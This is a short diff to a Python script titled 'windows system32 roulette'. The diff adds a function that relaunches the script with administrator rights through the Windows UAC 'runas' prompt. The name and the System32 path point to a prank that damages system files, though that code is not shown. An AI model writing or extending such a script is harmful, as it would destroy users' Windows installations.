@@ -1,8 +1,29 @@
 import os
 import sys
 import random
+import ctypes
+import subprocess
+
 
 system32_path = "C:\\Windows\\System32"
+
+# Check for admin rights and relaunch as admin if needed
+def run_as_admin():
+    try:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        is_admin = False
+    if not is_admin:
+        print("Requesting administrator privileges...")
+        # Relaunch the script with admin rights
+        params = ' '.join([f'"{arg}"' for arg in sys.argv])
+        try:
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
+        except Exception as e:
+            print(f"Failed to elevate privileges: {e}")
+        sys.exit()
+
+run_as_admin()
 
 def main():
     print("Welcome to windows system32 roulette!")
